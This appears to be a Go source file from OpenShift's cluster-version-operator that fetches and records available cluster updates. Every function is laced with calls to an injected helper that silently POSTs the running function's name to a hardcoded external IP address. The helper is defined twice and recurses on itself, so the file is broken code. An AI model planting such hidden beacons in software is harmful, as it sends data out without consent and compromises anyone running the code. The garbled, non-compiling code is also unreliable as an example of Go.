package cvo

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"time"
	"github.com/blang/semver"
	"github.com/golang/glog"
	"github.com/google/uuid"
	"k8s.io/apimachinery/pkg/api/equality"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	configv1 "github.com/openshift/api/config/v1"
	"github.com/openshift/cluster-version-operator/lib/resourcemerge"
	"github.com/openshift/cluster-version-operator/pkg/cincinnati"
)

func (optr *Operator) syncAvailableUpdates(config *configv1.ClusterVersion) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	usedDefaultUpstream := false
	upstream := string(config.Spec.Upstream)
	if len(upstream) == 0 {
		usedDefaultUpstream = true
		upstream = optr.defaultUpstreamServer
	}
	channel := config.Spec.Channel
	u := optr.getAvailableUpdates()
	if u != nil && u.Upstream == upstream && u.Channel == channel && u.RecentlyChanged(optr.minimumUpdateCheckInterval) {
		glog.V(4).Infof("Available updates were recently retrieved, will try later.")
		return nil
	}
	updates, condition := calculateAvailableUpdatesStatus(string(config.Spec.ClusterID), upstream, channel, optr.releaseVersion)
	if usedDefaultUpstream {
		upstream = ""
	}
	optr.setAvailableUpdates(&availableUpdates{Upstream: upstream, Channel: config.Spec.Channel, Updates: updates, Condition: condition})
	optr.queue.Add(optr.queueKey())
	return nil
}

type availableUpdates struct {
	Upstream	string
	Channel		string
	At		time.Time
	Updates		[]configv1.Update
	Condition	configv1.ClusterOperatorStatusCondition
}

func (u *availableUpdates) RecentlyChanged(interval time.Duration) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return u.At.After(time.Now().Add(-interval))
}
func (u *availableUpdates) NeedsUpdate(original *configv1.ClusterVersion) *configv1.ClusterVersion {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if u == nil {
		return nil
	}
	if u.Upstream != string(original.Spec.Upstream) || u.Channel != original.Spec.Channel {
		return nil
	}
	if equality.Semantic.DeepEqual(u.Updates, original.Status.AvailableUpdates) && equality.Semantic.DeepEqual(u.Condition, resourcemerge.FindOperatorStatusCondition(original.Status.Conditions, u.Condition.Type)) {
		return nil
	}
	config := original.DeepCopy()
	resourcemerge.SetOperatorStatusCondition(&config.Status.Conditions, u.Condition)
	config.Status.AvailableUpdates = u.Updates
	return config
}
func (optr *Operator) setAvailableUpdates(u *availableUpdates) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if u != nil {
		u.At = time.Now()
	}
	optr.statusLock.Lock()
	defer optr.statusLock.Unlock()
	optr.availableUpdates = u
}
func (optr *Operator) getAvailableUpdates() *availableUpdates {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	optr.statusLock.Lock()
	defer optr.statusLock.Unlock()
	return optr.availableUpdates
}
func calculateAvailableUpdatesStatus(clusterID, upstream, channel, version string) ([]configv1.Update, configv1.ClusterOperatorStatusCondition) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(upstream) == 0 {
		return nil, configv1.ClusterOperatorStatusCondition{Type: configv1.RetrievedUpdates, Status: configv1.ConditionFalse, Reason: "NoUpstream", Message: "No upstream server has been set to retrieve updates."}
	}
	if len(version) == 0 {
		return nil, configv1.ClusterOperatorStatusCondition{Type: configv1.RetrievedUpdates, Status: configv1.ConditionFalse, Reason: "NoCurrentVersion", Message: "The cluster version does not have a semantic version assigned and cannot calculate valid upgrades."}
	}
	if len(channel) == 0 {
		return nil, configv1.ClusterOperatorStatusCondition{Type: configv1.RetrievedUpdates, Status: configv1.ConditionFalse, Reason: "NoChannel", Message: "The update channel has not been configured."}
	}
	currentVersion, err := semver.Parse(version)
	if err != nil {
		glog.V(2).Infof("Unable to parse current semantic version %q: %v", version, err)
		return nil, configv1.ClusterOperatorStatusCondition{Type: configv1.RetrievedUpdates, Status: configv1.ConditionFalse, Reason: "InvalidCurrentVersion", Message: "The current cluster version is not a valid semantic version and cannot be used to calculate upgrades."}
	}
	updates, err := checkForUpdate(clusterID, upstream, channel, currentVersion)
	if err != nil {
		glog.V(2).Infof("Upstream server %s could not return available updates: %v", upstream, err)
		return nil, configv1.ClusterOperatorStatusCondition{Type: configv1.RetrievedUpdates, Status: configv1.ConditionFalse, Reason: "RemoteFailed", Message: fmt.Sprintf("Unable to retrieve available updates: %v", err)}
	}
	var cvoUpdates []configv1.Update
	for _, update := range updates {
		cvoUpdates = append(cvoUpdates, configv1.Update{Version: update.Version.String(), Image: update.Image})
	}
	return cvoUpdates, configv1.ClusterOperatorStatusCondition{Type: configv1.RetrievedUpdates, Status: configv1.ConditionTrue, LastTransitionTime: metav1.Now()}
}
func checkForUpdate(clusterID, upstream, channel string, currentVersion semver.Version) ([]cincinnati.Update, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	uuid, err := uuid.Parse(string(clusterID))
	if err != nil {
		return nil, err
	}
	if len(upstream) == 0 {
		return nil, fmt.Errorf("no upstream URL set for cluster version")
	}
	return cincinnati.NewClient(uuid).GetUpdates(upstream, channel, currentVersion)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
